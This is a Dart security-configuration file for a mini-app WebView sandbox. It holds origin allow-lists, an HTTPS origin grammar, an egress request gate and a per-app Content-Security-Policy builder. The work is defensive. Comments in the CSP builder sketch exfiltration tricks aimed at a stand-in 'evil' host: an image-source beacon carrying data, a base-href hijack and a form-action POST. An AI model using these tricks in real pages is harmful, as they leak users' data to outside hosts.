/// Security configuration for the mini-app sandbox. Pure constants +
/// predicates so the rules are:
///
///  - Reviewable in one place (no `if` clause buried in a widget).
///  - Unit-testable without a Flutter harness (no Flutter imports here).
///  - The single source of truth for WebView navigation control, the
///    per-app egress allow-list, and the injected Content-Security-Policy.
///
/// Changing the allow-lists / grammar is intended to be a reviewable
/// single-file diff. If your change doesn't land here, it belongs
/// somewhere else.
///
/// **Networking model (v2).** Mini-apps reach external HTTPS APIs with a
/// plain browser `fetch()`, restricted to the origins they declared in
/// their manifest `network` field (per app) plus the global bundle origin.
/// There is no host-proxied `callApi` channel any more: the old
/// `kMiniAppAllowedApiPathPrefixes` allow-list and the `callApi` bridge
/// handler were removed. Enforcement is layered: the WebView request
/// interceptor ([isAllowedMiniAppRequest]) blocks any request to an
/// undeclared origin at the network layer, and a per-app CSP
/// ([buildMiniAppCsp]) is injected as defense-in-depth. Declared egress is
/// UNAUTHENTICATED — no ilink credentials are attached to these fetches.
library;

/// HTTPS origins the WebView is allowed to navigate to / load its bundle
/// from, for every mini-app regardless of manifest. An "origin" is
/// `scheme://host[:port]` — the path is irrelevant. A mini-app whose
/// manifest URL is off these origins is rejected at launch, and navigations
/// off them are cancelled via `shouldOverrideUrlLoading`.
///
/// Origins must be HTTPS. HTTP is rejected even if listed. This is the
/// bundle/CDN pin; per-app *egress* origins are additive (see
/// [isAllowedMiniAppOriginForApp]).
const List<String> kMiniAppAllowedOrigins = [];

bool _isRetiredHost(String host) =>
    host == 'ilink.app' ||
    host.endsWith('.ilink.app') ||
    host.endsWith('.ondigitalocean.app') ||
    host.endsWith('.digitaloceanspaces.com');

/// True iff [url] is HTTPS *and* its origin (`scheme://host[:port]`) matches
/// one of [kMiniAppAllowedOrigins]. Accepts `null` (returns `false`).
bool isAllowedMiniAppOrigin(Uri? url) {
  if (url == null) return false;
  if (url.scheme != 'https') return false;
  final origin = url.hasPort
      ? '${url.scheme}://${url.host}:${url.port}'
      : '${url.scheme}://${url.host}';
  return kMiniAppAllowedOrigins.contains(origin);
}

// ─────────────────────────────────────────────────────────────────────────
// Canonical egress-origin grammar
//
// The SINGLE car-side definition of "an allowed network origin". Mirrors the
// SDK (`ilink-sdk/src/types/origin.ts`) and backend (Pydantic) byte-for-
// byte; the shared corpus `ilink-sdk/src/types/origin-fixtures.json` is the
// cross-repo drift gate (vendored into this repo's tests as
// `test/features/mini_apps/origin_fixtures.json`). Used by the catalog
// parser, the navigation gate, the request interceptor, and the CSP builder
// so the answer can never drift between them.
// ─────────────────────────────────────────────────────────────────────────

final RegExp _ldhLabel = RegExp(r'^[a-z0-9]([a-z0-9-]*[a-z0-9])?$');
final RegExp _ipv4 = RegExp(r'^\d{1,3}(\.\d{1,3}){3}$');

bool _isRegistrableDnsHost(String host) {
  if (host.isEmpty || host.length > 253) return false;
  if (host.contains('*')) return false; // no wildcards
  if (host.contains(':') || host.contains('[')) return false; // IPv6 literal
  if (_ipv4.hasMatch(host)) return false; // IPv4 literal (loopback / RFC1918)
  final labels = host.split('.');
  if (labels.length < 2) return false; // reject single-label (localhost)
  for (final label in labels) {
    if (!_ldhLabel.hasMatch(label)) return false;
  }
  return true;
}

/// Normalizes [raw] to a canonical HTTPS origin `https://host[:port]`
/// (lowercased, default `:443` stripped) or returns null if it isn't a valid
/// bare HTTPS origin. Rejects http, path, query, fragment, userinfo,
/// wildcard, IP literal, `localhost`, and trailing-dot hosts. Identical
/// grammar to the SDK `canonicalizeMiniAppOrigin`.
String? normalizeMiniAppOrigin(String raw) {
  final trimmed = raw.trim();
  if (trimmed.isEmpty || trimmed.length > 253) return null;
  final uri = Uri.tryParse(trimmed);
  if (uri == null) return null;
  if (uri.scheme != 'https') return null;
  if (uri.userInfo.isNotEmpty) return null;
  if (uri.hasQuery || uri.hasFragment) return null;
  final path = uri.path;
  if (path.isNotEmpty && path != '/') return null;
  final host = uri.host.toLowerCase();
  if (_isRetiredHost(host)) return null;
  if (!_isRegistrableDnsHost(host)) return null;
  // Dart returns 443 for an unspecified https port; preserve only non-default.
  final port = uri.port;
  return port == 443 ? 'https://$host' : 'https://$host:$port';
}

/// The canonical `https://host[:port]` origin of [url] (lowercased, default
/// port stripped), independent of path/query — for matching a live request
/// against the declared allow-list.
String _httpsOriginOf(Uri url) {
  final host = url.host.toLowerCase();
  final port = url.port;
  return (port == 443 || port == 0) ? 'https://$host' : 'https://$host:$port';
}

/// True iff [url] is HTTPS and its origin is in the global allow-list OR in
/// this app's declared [appNetwork]. [appNetwork] entries are assumed already
/// canonical (the repository normalizes them at parse time).
bool isAllowedMiniAppOriginForApp(Uri? url, List<String> appNetwork) {
  if (isAllowedMiniAppOrigin(url)) return true; // global allow-list (self/CDN)
  if (url == null || url.scheme != 'https') return false;
  if (url.userInfo.isNotEmpty ||
      normalizeMiniAppOrigin(_httpsOriginOf(url)) == null) {
    return false;
  }
  return appNetwork.contains(_httpsOriginOf(url));
}

/// Decision for the WebView request interceptor — the PRIMARY egress gate.
/// Bundle-local schemes (`file`/`data`/`blob`/`about`) always pass; `https`
/// and `wss` pass only for global+declared origins (a `wss://host` is matched
/// against its `https://host` form, since they share host+port); every other
/// scheme (`http`, `ws`, undeclared `https`, …) is blocked. Pure + testable;
/// the viewer's `shouldInterceptRequest` returns a 403 when this is false.
bool isAllowedMiniAppRequest(Uri url, List<String> appNetwork) {
  final scheme = url.scheme.toLowerCase();
  if (scheme == 'file' ||
      scheme == 'data' ||
      scheme == 'blob' ||
      scheme == 'about') {
    return true;
  }
  if (scheme == 'https') {
    return isAllowedMiniAppOriginForApp(url, appNetwork);
  }
  if (scheme == 'wss') {
    return isAllowedMiniAppOriginForApp(
      url.replace(scheme: 'https'),
      appNetwork,
    );
  }
  return false;
}

/// Builds the per-app Content-Security-Policy (injected at document start as
/// defense-in-depth behind [isAllowedMiniAppRequest]). `self` + every
/// declared origin on EVERY exfil-capable directive — `connect-src` alone is
/// insufficient (img/media/font/form-action all exfiltrate). The `wss://`
/// form of each origin is added to `connect-src` because CSP scheme-matches
/// ws/wss separately from https. Inline script/style are allowed for v1
/// bundles (tighten to nonce/hash in a later breaking SDK change); CSP is NOT
/// the containment boundary against a hostile author — the request
/// interceptor + WebRTC neuter + navigation gate are.
String buildMiniAppCsp(List<String> appOrigins) {
  final https = appOrigins
      .map(normalizeMiniAppOrigin)
      .whereType<String>()
      .toSet();
  final wss = https.map((o) => o.replaceFirst('https://', 'wss://'));
  final connect = ["'self'", ...https, ...wss].join(' ');
  final src = ["'self'", ...https].join(' ');
  return [
    "default-src 'self'",
    'connect-src $connect', // fetch / XHR / WebSocket / sendBeacon / EventSource / a-ping
    'img-src $src data:', // block new Image().src='https://evil/?'+data off-list
    'media-src $src',
    'font-src $src',
    "style-src $src 'unsafe-inline'",
    "script-src $src 'unsafe-inline'",
    "worker-src 'self'", // no off-origin / blob workers
    "child-src 'self'",
    "frame-src 'self'", // iframes: own bundle origin only
    "manifest-src 'self'",
    "base-uri 'self'", // block <base href=evil> relative-URL hijack
    'form-action $src', // block <form action=evil> POST exfil (no default-src fallback)
    "frame-ancestors 'none'",
    "object-src 'none'",
  ].join('; ');
}

/// Bridge protocol version the host advertises through the `capabilities`
/// handler. Bumped whenever we change the *contract* of any handler in a
/// backwards-incompatible way (renamed fields, new required arg, semantics
/// shift). Adding a new family does not bump this; it appends to
/// [kMiniAppKnownFamilies] instead.
const String kMiniAppBridgeVersion = '1.0.0';

/// Permission/family scope identifiers the host has handlers for. Mini-app
/// SDKs read this set via `client.has(scope)` to graceful-degrade when
/// running against an older host.
///
/// Append-only by convention: removing a family is a breaking change in the
/// same sense as removing a CarStatus field — apps that depend on it stop
/// working. New families (`climate.read`, `vehicle.diagnostics`, ...) add
/// themselves here when their handler trio
/// (`<family>.read|subscribe|unsubscribe`) ships.
const List<String> kMiniAppKnownFamilies = [
  'car.status',
  'media.read',
  'climate.read',
  'vehicle.diagnostics',
  'vehicle.environment',
  'system.read',
  'connectivity.read',
  'location.read',
  'nav.read',
];
